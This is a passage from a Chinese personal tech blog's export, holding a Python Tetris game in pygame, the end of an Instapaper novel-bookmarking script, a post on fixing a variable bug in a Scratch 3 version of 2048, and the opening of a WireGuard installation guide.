class="built_in">print</span>(latest_title[k], latest_url[k],</span><br><span class="line">                  latest_url[k].replace(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;_2.html&quot;</span>))</span><br><span class="line">            add_bookmark_instapaper(</span><br><span class="line">                latest_title[k] + <span class="string">&quot; part 2&quot;</span>,</span><br><span class="line">                latest_url[k].replace(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;_2.html&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">            add_bookmark_instapaper(latest_title[k], latest_url[k])</span><br><span class="line"></span><br><span class="line">        old_url = latest_url</span><br><span class="line">        url_archive.append(old_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(url_archive, f)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次抓取新的文章之前，先把以前的删掉</span></span><br><span class="line">bookmarks = instapaper.get_bookmarks(<span class="string">&#x27;unread&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ct, bookmark <span class="keyword">in</span> <span class="built_in">enumerate</span>(bookmarks):</span><br><span class="line">    <span class="built_in">print</span>(bookmark.title)</span><br><span class="line">    bookmark.archive()</span><br><span class="line">    bookmark.delete()</span><br><span class="line"></span><br><span class="line">fetch_novel(novel_list, novel_url)</span><br></pre></td></tr></table></figure>

<p>OK 了。</p>
]]></content>
      <tags>
        <tag>Kindle</tag>
        <tag>Python</tag>
        <tag>Instapaper</tag>
        <tag>pyinstapaper</tag>
        <tag>BeautifulSoup</tag>
        <tag>bs4</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Python 实现简单的俄罗斯方块（tetris）游戏</title>
    <url>/2020/08/%E7%94%A8%20Python%20%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88tetris%EF%BC%89%E6%B8%B8%E6%88%8F/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近又（为什么要说“又”呢？）在学着用 Python 来解决一些实际问题，希望能从真实应用场景中提升编码的能力。前面的 <a href="/2020/07/%E7%94%A8%20Kindle%20%E8%BF%BD%E7%BD%91%E6%96%87_2/index.html" title="用 Kindle 来追网文之二">用 Kindle 追网文之二</a> 是，现在的俄罗斯方块也是。</p>
<span id="more"></span>

<h2 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">colors = [</span><br><span class="line">    (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">    (<span class="number">120</span>, <span class="number">37</span>, <span class="number">179</span>),</span><br><span class="line">    (<span class="number">100</span>, <span class="number">179</span>, <span class="number">179</span>),</span><br><span class="line">    (<span class="number">80</span>, <span class="number">34</span>, <span class="number">22</span>),</span><br><span class="line">    (<span class="number">80</span>, <span class="number">134</span>, <span class="number">22</span>),</span><br><span class="line">    (<span class="number">180</span>, <span class="number">34</span>, <span class="number">22</span>),</span><br><span class="line">    (<span class="number">180</span>, <span class="number">34</span>, <span class="number">122</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Figure</span>:</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    figures = [</span><br><span class="line">        [[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]],</span><br><span class="line">        [[<span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">10</span>], [<span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">9</span>]],</span><br><span class="line">        [[<span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>], [<span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">10</span>]],</span><br><span class="line">        [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">10</span>]],</span><br><span class="line">        [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>], [<span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">11</span>], [<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]],</span><br><span class="line">        [[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>], [<span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>]],</span><br><span class="line">        [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>]],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.<span class="built_in">type</span> = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(self.figures) - <span class="number">1</span>)</span><br><span class="line">        self.color = random.randint(<span class="number">1</span>, <span class="built_in">len</span>(colors) - <span class="number">1</span>)</span><br><span class="line">        self.rotation = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">image</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.figures[self.<span class="built_in">type</span>][self.rotation]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">self</span>):</span><br><span class="line">        self.rotation = (self.rotation + <span class="number">1</span>) % <span class="built_in">len</span>(self.figures[self.<span class="built_in">type</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tetris</span>:</span><br><span class="line">    level = <span class="number">1</span></span><br><span class="line">    score = <span class="number">0</span></span><br><span class="line">    state = <span class="string">&quot;start&quot;</span></span><br><span class="line">    field = []</span><br><span class="line">    height = <span class="number">0</span></span><br><span class="line">    width = <span class="number">0</span></span><br><span class="line">    x = <span class="number">100</span></span><br><span class="line">    y = <span class="number">60</span></span><br><span class="line">    zoom = <span class="number">20</span></span><br><span class="line">    figure = <span class="literal">None</span></span><br><span class="line">    figure_next = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, height, width</span>):</span><br><span class="line">        self.height = height</span><br><span class="line">        self.width = width</span><br><span class="line">        self.field = []</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.state = <span class="string">&quot;start&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            new_line = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                new_line.append(<span class="number">0</span>)</span><br><span class="line">            self.field.append(new_line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_figure</span>(<span class="params">self</span>):</span><br><span class="line">        self.figure = Figure(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_next_figure</span>(<span class="params">self</span>):</span><br><span class="line">        self.figure_next = Figure(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">intersects</span>(<span class="params">self</span>):</span><br><span class="line">        intersection = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> i * <span class="number">4</span> + j <span class="keyword">in</span> self.figure.image():</span><br><span class="line">                    <span class="keyword">if</span> i + self.figure.y &gt; self.height - <span class="number">1</span> <span class="keyword">or</span> \</span><br><span class="line">                            j + self.figure.x &gt; self.width - <span class="number">1</span> <span class="keyword">or</span> \</span><br><span class="line">                            j + self.figure.x &lt; <span class="number">0</span> <span class="keyword">or</span> \</span><br><span class="line">                            self.field[i +</span><br><span class="line">                                       self.figure.y][j +</span><br><span class="line">                                                      self.figure.x] &gt; <span class="number">0</span>:</span><br><span class="line">                        intersection = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> intersection</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">break_lines</span>(<span class="params">self</span>):</span><br><span class="line">        lines = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.height):</span><br><span class="line">            zeros = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.width):</span><br><span class="line">                <span class="keyword">if</span> self.field[i][j] == <span class="number">0</span>:</span><br><span class="line">                    zeros += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> zeros == <span class="number">0</span>:</span><br><span class="line">                lines += <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.width):</span><br><span class="line">                        self.field[i1][j] = self.field[i1 - <span class="number">1</span>][j]</span><br><span class="line">        self.score += lines ** <span class="number">2</span></span><br><span class="line">        self.level = self.score // <span class="number">100</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go_space</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.intersects():</span><br><span class="line">            self.figure.y += <span class="number">1</span></span><br><span class="line">        self.figure.y -= <span class="number">1</span></span><br><span class="line">        self.freeze()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go_down</span>(<span class="params">self</span>):</span><br><span class="line">        self.figure.y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.intersects():</span><br><span class="line">            self.figure.y -= <span class="number">1</span></span><br><span class="line">            self.freeze()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">freeze</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                <span class="keyword">if</span> i * <span class="number">4</span> + j <span class="keyword">in</span> self.figure.image():</span><br><span class="line">                    self.field[</span><br><span class="line">                        i + self.figure.y][</span><br><span class="line">                            j + self.figure.x] = self.figure.color</span><br><span class="line">        self.break_lines()</span><br><span class="line">        self.new_figure()</span><br><span class="line">        tmp_x = self.figure.x</span><br><span class="line">        tmp_y = self.figure.y</span><br><span class="line">        self.figure = self.figure_next</span><br><span class="line">        self.figure.x = tmp_x</span><br><span class="line">        self.figure.y = tmp_y</span><br><span class="line">        self.new_next_figure()</span><br><span class="line">        <span class="keyword">if</span> self.intersects():</span><br><span class="line">            self.state = <span class="string">&quot;gameover&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go_side</span>(<span class="params">self, dx</span>):</span><br><span class="line">        old_x = self.figure.x</span><br><span class="line">        self.figure.x += dx</span><br><span class="line">        <span class="keyword">if</span> self.intersects():</span><br><span class="line">            self.figure.x = old_x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">self</span>):</span><br><span class="line">        old_rotation = self.figure.rotation</span><br><span class="line">        self.figure.rotate()</span><br><span class="line">        <span class="keyword">if</span> self.intersects():</span><br><span class="line">            self.figure.rotation = old_rotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the game engine</span></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define some colors</span></span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WHITE = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">GRAY = (<span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">size = (<span class="number">400</span>, <span class="number">500</span>)</span><br><span class="line">screen = pygame.display.set_mode(size)</span><br><span class="line"></span><br><span class="line">pygame.display.set_caption(<span class="string">&quot;Tetris&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop until the user clicks the close button.</span></span><br><span class="line">done = <span class="literal">False</span></span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line">fps = <span class="number">25</span></span><br><span class="line">game = Tetris(<span class="number">20</span>, <span class="number">10</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pressing_down = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">    <span class="keyword">if</span> game.figure <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        game.new_figure()</span><br><span class="line">        game.new_next_figure()</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> counter &gt; <span class="number">100000</span>:</span><br><span class="line">        counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> counter % (fps // game.level // <span class="number">2</span>) == <span class="number">0</span> <span class="keyword">or</span> pressing_down:</span><br><span class="line">        <span class="keyword">if</span> game.state == <span class="string">&quot;start&quot;</span>:</span><br><span class="line">            game.go_down()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.KEYDOWN:</span><br><span class="line">            <span class="keyword">if</span> game.state == <span class="string">&quot;paused&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_p:</span><br><span class="line">                    game.state = <span class="string">&quot;start&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> game.state == <span class="string">&quot;start&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_UP:</span><br><span class="line">                    game.rotate()</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_DOWN:</span><br><span class="line">                    pressing_down = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_LEFT:</span><br><span class="line">                    game.go_side(-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">                    game.go_side(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_SPACE:</span><br><span class="line">                    game.go_space()</span><br><span class="line">                <span class="keyword">if</span> event.key == pygame.K_p:</span><br><span class="line">                    game.state = <span class="string">&quot;paused&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_ESCAPE:</span><br><span class="line">                game.__init__(<span class="number">20</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.KEYUP:</span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_DOWN:</span><br><span class="line">                pressing_down = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    screen.fill(WHITE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.figure_next <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                p = i * <span class="number">4</span> + j</span><br><span class="line">                <span class="keyword">if</span> p <span class="keyword">in</span> game.figure_next.image():</span><br><span class="line">                    pygame.draw.rect(</span><br><span class="line">                        screen,</span><br><span class="line">                        colors[game.figure_next.color],</span><br><span class="line">                        [<span class="number">0</span> + game.zoom * (j + game.figure_next.x) + <span class="number">1</span>,</span><br><span class="line">                         <span class="number">60</span> + game.zoom * (i + game.figure_next.y) + <span class="number">1</span>,</span><br><span class="line">                         game.zoom - <span class="number">2</span>,</span><br><span class="line">                         game.zoom - <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(game.height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(game.width):</span><br><span class="line">            pygame.draw.rect(</span><br><span class="line">                screen,</span><br><span class="line">                GRAY,</span><br><span class="line">                [game.x + game.zoom * j,</span><br><span class="line">                 game.y + game.zoom * i,</span><br><span class="line">                 game.zoom,</span><br><span class="line">                 game.zoom],</span><br><span class="line">                <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> game.field[i][j] &gt; <span class="number">0</span>:</span><br><span class="line">                pygame.draw.rect(</span><br><span class="line">                    screen,</span><br><span class="line">                    colors[game.field[i][j]],</span><br><span class="line">                    [game.x + game.zoom * j + <span class="number">1</span>,</span><br><span class="line">                     game.y + game.zoom * i + <span class="number">1</span>,</span><br><span class="line">                     game.zoom - <span class="number">2</span>,</span><br><span class="line">                     game.zoom - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> game.figure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                p = i * <span class="number">4</span> + j</span><br><span class="line">                <span class="keyword">if</span> p <span class="keyword">in</span> game.figure.image():</span><br><span class="line">                    pygame.draw.rect(</span><br><span class="line">                        screen,</span><br><span class="line">                        colors[game.figure.color],</span><br><span class="line">                        [game.x + game.zoom * (j + game.figure.x) + <span class="number">1</span>,</span><br><span class="line">                         game.y + game.zoom * (i + game.figure.y) + <span class="number">1</span>,</span><br><span class="line">                         game.zoom - <span class="number">2</span>,</span><br><span class="line">                         game.zoom - <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    font = pygame.font.SysFont(<span class="string">&#x27;Calibri&#x27;</span>, <span class="number">25</span>, <span class="literal">True</span>, <span class="literal">False</span>)</span><br><span class="line">    font1 = pygame.font.SysFont(<span class="string">&#x27;Calibri&#x27;</span>, <span class="number">65</span>, <span class="literal">True</span>, <span class="literal">False</span>)</span><br><span class="line">    text = font.render(<span class="string">&quot;Score: &quot;</span> + <span class="built_in">str</span>(game.score) + <span class="string">&quot; Speed: &quot;</span> + <span class="built_in">str</span>(game.level), <span class="literal">True</span>, BLACK)</span><br><span class="line">    text1 = font.render(<span class="string">&quot;Next :&quot;</span>, <span class="literal">True</span>, BLACK)</span><br><span class="line">    text_game_over = font1.render(<span class="string">&quot;Game Over&quot;</span>, <span class="literal">True</span>, (<span class="number">255</span>, <span class="number">125</span>, <span class="number">0</span>))</span><br><span class="line">    text_game_over1 = font1.render(<span class="string">&quot;Press ESC&quot;</span>, <span class="literal">True</span>, (<span class="number">255</span>, <span class="number">215</span>, <span class="number">0</span>))</span><br><span class="line">    text_paused = font1.render(<span class="string">&quot;PAUSED&quot;</span>, <span class="literal">True</span>, (<span class="number">255</span>, <span class="number">125</span>, <span class="number">0</span>))</span><br><span class="line">    text_paused1 = font1.render(<span class="string">&quot;p-&gt;continue&quot;</span>, <span class="literal">True</span>, (<span class="number">255</span>, <span class="number">215</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    screen.blit(text, [<span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">    screen.blit(text1, [<span class="number">0</span>, <span class="number">26</span>])</span><br><span class="line">    <span class="keyword">if</span> game.state == <span class="string">&quot;gameover&quot;</span>:</span><br><span class="line">        screen.blit(text_game_over, [<span class="number">5</span>, <span class="number">200</span>])</span><br><span class="line">        screen.blit(text_game_over1, [<span class="number">20</span>, <span class="number">265</span>])</span><br><span class="line">    <span class="keyword">if</span> game.state == <span class="string">&quot;paused&quot;</span>:</span><br><span class="line">        screen.blit(text_paused, [<span class="number">20</span>, <span class="number">200</span>])</span><br><span class="line">        screen.blit(text_paused1, [<span class="number">1</span>, <span class="number">265</span>])</span><br><span class="line"></span><br><span class="line">    pygame.display.flip()</span><br><span class="line">    clock.tick(fps)</span><br><span class="line"></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure>

<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>要首先安装软件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pygame</span><br></pre></td></tr></table></figure>

<h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><ol>
<li>原始代码来自于<a href="https://gist.github.com/timurbakibayev/1f683d34487362b0f36280989c80960c/raw/bf7bbed19315e4124ee04826be192ecc5bf2d8a1/tetris.py">这里</a></li>
<li>参考了 <a href="https://levelup.gitconnected.com/writing-tetris-in-python-2a16bddb5318">How to write Tetris in Python</a></li>
<li>我给新增了几项功能<ol>
<li>增加了预览下一个块式样的功能</li>
<li>增加游戏暂停功能</li>
<li>增加了随着分数增加块下落的速度也跟着加快的功能</li>
</ol>
</li>
</ol>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Python3</tag>
        <tag>tetris</tag>
        <tag>pygame</tag>
        <tag>game</tag>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Scratch 3 制作小游戏：2048</title>
    <url>/2023/01/%E7%94%A8%20Scratch%203%20%E5%88%B6%E4%BD%9C%E5%B0%8F%E6%B8%B8%E6%88%8F%EF%BC%9A2048/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>乐宝幼儿园的时候上过一段时间的 Scratch 的课，他对这个表现出了浓厚的兴趣，于是我就给他买了基本相关的书籍，他也爱不释手。由于领导注意到乐宝对电子产品的痴迷，怕他迷失，所以规定他周末才能玩儿半小时的 Scratch。我发现他在用 Scratch 做一点小程序（照着书吧），而且还乐此不疲。正好我也有时间，所以我想琢磨下怎么做个游戏，然后再教乐乐（编写）。</p>
<span id="more"></span>

<p>真的是这样吗？哈哈，真的起源原因真不是这样的，而是因为乐乐手头有一个我二十多年前买的 Handspring 的 Visor，就是这一款：<a href="https://www.ifixit.com/Device/Handspring_Visor_Deluxe_PDA">Handspring Visor Deluxe PDA@ifixit</a>，乐乐也很喜欢，但我网上找了找，几乎已经没有任何应用了，连中文支持：CJK，貌似都没法用了。于是我想能不能自己写点简单的小程序，port 上去。于是就有了写个小游戏：2048 的想法。</p>
<p>这才是最初的需求，至于改用 Scratch 来弄，那是后来的想法。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>后来一搜，Scratch 官网就有一大堆的 2048 游戏程序例程（当然是别人分享出来的），我看了好多，都觉得有点复杂。而且油管上也有人录视频专门讲怎样编写 2048 这个游戏。本来想哪天翻译下来，再录个视频（又给自己挖了个坑：）。然后在中文世界里翻一翻，发现 B 站也有详细讲解的中文的视频。具体链接在这里：<a href="https://www.bilibili.com/video/BV1oZ4y1s7TQ/">B 站用 Scratch 编写 2048 游戏的教学视频</a> 然后我的这个 2048 程序也是完全按照这个视频做（抄）下来的。</p>
<p>所以，这里说起来过程，其实就是一个字：抄。：）</p>
<p>言归正传。这个视频里其实还是有一些小坑的。大家从头看到尾了就会知道。有些的，是前面挖，但是后面自己填了，但是有一些是没填的。我这里就提一下没填的。其实主要就是一个：变量 <code>clone?</code> 的问题。</p>
<p>这个变量我理解应该是标识角色是否是克隆体的。由于作者的疏忽，视频里作者点击“新建一个变量”，然后输入变量名“clond?”，保持缺省选项：“所有角色可见”的前提下点击“OK”，结果发现系统已有这个变量。这是个容易忽视的小细节。在我的系统里（Scratch 3.29）里，照作者的方式是能新建这个变量：<code>clone?</code> 的，就算系统已存在叫“clone?”的变量。</p>
<p>然后一直到最后，我都发现有一个小问题：就是我的程序跑起来，会在 4x4 方格的右下方，显示一个方框角色，怎么都弄不掉。仔细再看了看程序代码，发现这个方块是方块角色做完 16 次克隆自己的操作以后移动到的位置。但是按照程序里处理广播消息：show 的积木块的代码来讲，母体角色是应该不显示的呀。再仔细看看处理广播消息：show 的程序，发现这个逻辑有问题：</p>
<p>这段程序是在 <code>clone? = 1</code> 的前提下才执行的（这个思路貌似很清晰：只有克隆块才执行），但问题是启动时变量 <code>clone?</code> 被赋值为 0，但是在“当作为克隆体启动时执行”的代码块里，又将 <code>clone?</code> 设置成了 1。问题来了，<code>clone?</code> 是个全局变量，克隆体里将其设置为 1 了，那么母体角色也能读到，所以每次做 show 操作时，母体角色执行时也会是 <code>clone? = 1</code> 成立，所以母体角色也被显示了出来。:(</p>
<p>当然，也有其他办法来修复这个 bug，但我又翻了翻 Scratch 关于变量的资料，发现其实这里只要将 <code>clone?</code> 设置为本角色可见就行了。因为在母体角色里，<code>clone?</code> 是为 0 的（系统启动时设置的）。克隆以后，克隆体继承了这个私有变量（本角色可见的变量），然后又在“作为克隆体启动时”的代码块里将其（<code>clone?</code>）设置成了 1，但是母体角色里 <code>clone?</code> 还是 0！！！！！这样母体角色在执行处理 show 消息的代码块时，判断 <code>clone? = 1</code> 不成立，所以不会被显示。问题被解决。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这里贴一张改好后我自己玩儿 2048 时的截图</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/Screenshot%202023-09-28%20at%2010.40.13.png" alt="2048，我玩儿到 512 了"></p>
<p>然后，最最后，我把代码贴出来，有兴趣的可以用来教小朋友哟。哈哈</p>
<ul>
<li><a href="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/2048.sb3">整个 2048 项目 Scratch 3 源代码</a></li>
</ul>
]]></content>
      <tags>
        <tag>game</tag>
        <tag>游戏</tag>
        <tag>Scratch</tag>
        <tag>Scratch3</tag>
        <tag>2048</tag>
        <tag>Handspring Visor</tag>
        <tag>PDA</tag>
      </tags>
  </entry>
  <entry>
    <title>用 wireguard 在两个网络之间打洞</title>
    <url>/2019/11/%E7%94%A8%20wireguard%20%E5%9C%A8%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%B9%8B%E9%97%B4%E6%89%93%E6%B4%9E/index.html</url>
    <content><![CDATA[<h1 id="0-缘起"><a href="#0-缘起" class="headerlink" title="0 缘起"></a>0 缘起</h1><p>基于管理和安全的考虑，我们制定了一个大内网计划（T13），希望将公司所有的网路（办公室，各个公有云的 VPC 等）的内网打通。具体可选方案很多，我们这里采用的是 wireguard</p>
<span id="more"></span>

<h1 id="1-wireguard-安装"><a href="#1-wireguard-安装" class="headerlink" title="1 wireguard 安装"></a>1 wireguard 安装</h1><h2 id="1-1-Ubuntu"><a href="#1-1-Ubuntu" class="headerlink" title="1.1 Ubuntu"></a>1.1 Ubuntu</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># begin with 19.10(Eoan), the two following statement are not needed</span></span><br><span class="line"><span class="comment"># 19.10(Eoan) 之后，以下这两句不用再执行。</span></span><br><span class="line">apt install software-properties-common;</span><br><span class="line">add-apt-repository ppa:wireguard/wireguard;</span><br><span class="line">	</span><br><span class="line">apt-get update;</span><br><span class="line">apt-get install wireguard;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-CentOS"><a href="#1-2-CentOS" class="headerlink" title="1.2 CentOS"></a>1.2 CentOS</h2><p>以下是以 CentOS 7.* 为例，RHEL 7.* 亦然，如果是 6 或 8 系列的话，将 7 改成 6 或 8</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -Lo /etc/yum.repos.d/wireguard.repo \ </span><br><span class="line">    https://copr.fedorainfracloud.org/coprs/jdoss/wireguard/repo/epel-7/jdoss-wireguard-epel-7.repo;</span><br><span class="line">yum install wireguard-dkms wireguard-tools;</span><br></pre></td></tr></table></figure>

